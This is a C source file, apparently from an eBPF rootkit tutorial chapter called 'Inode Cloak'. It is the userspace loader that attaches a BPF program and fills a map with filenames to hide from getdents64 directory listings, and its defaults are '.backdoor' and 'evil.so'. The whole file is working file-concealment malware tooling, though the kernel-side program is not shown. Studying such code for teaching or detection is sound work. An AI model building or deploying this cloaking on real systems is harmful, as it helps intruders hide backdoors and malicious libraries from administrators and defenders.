// Ch10 Inode Cloak — userspace loader.
//
// Hides arbitrary filenames from getdents64 by populating a BPF HASH map.
// Filenames to hide come from CLI args (positional or repeated --hidden);
// if none are given the loader falls back to ".backdoor" and "evil.so"
// to preserve the original demo behaviour.
//
// Status messages go to stderr; ringbuf cloak events go to stdout so the
// stream can be piped (`./ch10-inode-cloak > events.log`).

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>
#include <getopt.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "ch10-inode-cloak.skel.h"

#define NAME_MAX_LEN 64
#define MAX_HIDDEN   32

struct hidden_name { char name[NAME_MAX_LEN]; };
struct evt {
    unsigned int pid;
    char comm[16];
    char hidden[NAME_MAX_LEN];
};

static volatile int stop;
static void sig(int _sig){ (void)_sig; stop = 1; }

static void usage(const char *argv0)
{
    fprintf(stderr,
        "Usage: %s [options] [filename ...]\n"
        "\n"
        "Hide the listed filenames from getdents64. Positional args are\n"
        "added to the hidden set, as are any --hidden/-H values.\n"
        "If no filenames are given, defaults are: .backdoor, evil.so\n"
        "\n"
        "Options:\n"
        "  -H, --hidden <name>   Add a filename to hide (repeatable)\n"
        "  -h, --help            Show this help and exit\n",
        argv0);
}

static int handle(void *ctx, void *data, size_t sz)
{
    (void)ctx; (void)sz;
    struct evt *e = data;
    printf("[cloak] pid=%u\tcomm=%s\thiding=%s\n",
           e->pid, e->comm, e->hidden);
    fflush(stdout);
    return 0;
}

static int add_hidden(struct ch10_inode_cloak_bpf *s, const char *n)
{
    struct hidden_name k = {};
    unsigned char v = 1;
    if (!n || !*n) return -1;
    strncpy(k.name, n, NAME_MAX_LEN - 1);
    int err = bpf_map__update_elem(s->maps.hidden, &k, sizeof(k),
                                   &v, sizeof(v), BPF_ANY);
    if (err) {
        fprintf(stderr, "[ch10] map_update hidden=%s failed: %s\n",
                n, strerror(-err));
        return err;
    }
    fprintf(stderr, "[ch10] hidden=%s\n", n);
    return 0;
}

int main(int argc, char **argv)
{
    static const struct option longopts[] = {
        { "hidden", required_argument, NULL, 'H' },
        { "help",   no_argument,       NULL, 'h' },
        { NULL, 0, NULL, 0 },
    };

    const char *queue[MAX_HIDDEN];
    int nqueue = 0;
    int c;
    while ((c = getopt_long(argc, argv, "H:h", longopts, NULL)) != -1) {
        switch (c) {
        case 'H':
            if (nqueue >= MAX_HIDDEN) {
                fprintf(stderr, "[ch10] too many --hidden entries (max %d)\n",
                        MAX_HIDDEN);
                return 2;
            }
            queue[nqueue++] = optarg;
            break;
        case 'h':
            usage(argv[0]);
            return 0;
        default:
            usage(argv[0]);
            return 2;
        }
    }
    for (int i = optind; i < argc && nqueue < MAX_HIDDEN; i++)
        queue[nqueue++] = argv[i];

    int use_defaults = (nqueue == 0);

    struct ch10_inode_cloak_bpf *s = ch10_inode_cloak_bpf__open_and_load();
    if (!s) {
        fprintf(stderr, "[ch10] open_and_load failed: %s\n", strerror(errno));
        return 1;
    }
    if (ch10_inode_cloak_bpf__attach(s)) {
        fprintf(stderr, "[ch10] attach failed: %s\n", strerror(errno));
        ch10_inode_cloak_bpf__destroy(s);
        return 1;
    }

    if (use_defaults) {
        fprintf(stderr, "[ch10] no filenames given — using defaults\n");
        add_hidden(s, ".backdoor");
        add_hidden(s, "evil.so");
    } else {
        for (int i = 0; i < nqueue; i++)
            add_hidden(s, queue[i]);
    }

    struct ring_buffer *rb = ring_buffer__new(
        bpf_map__fd(s->maps.events), handle, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "[ch10] ringbuf new failed: %s\n", strerror(errno));
        ch10_inode_cloak_bpf__destroy(s);
        return 1;
    }

    signal(SIGINT,  sig);
    signal(SIGTERM, sig);
    fprintf(stderr, "[ch10] attached — cloak active (Ctrl-C to stop)\n");

    while (!stop) {
        int err = ring_buffer__poll(rb, 200);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "[ch10] ringbuf poll: %s\n", strerror(-err));
            break;
        }
    }

    fprintf(stderr, "[ch10] shutting down\n");
    ring_buffer__free(rb);
    ch10_inode_cloak_bpf__destroy(s);
    return 0;
}
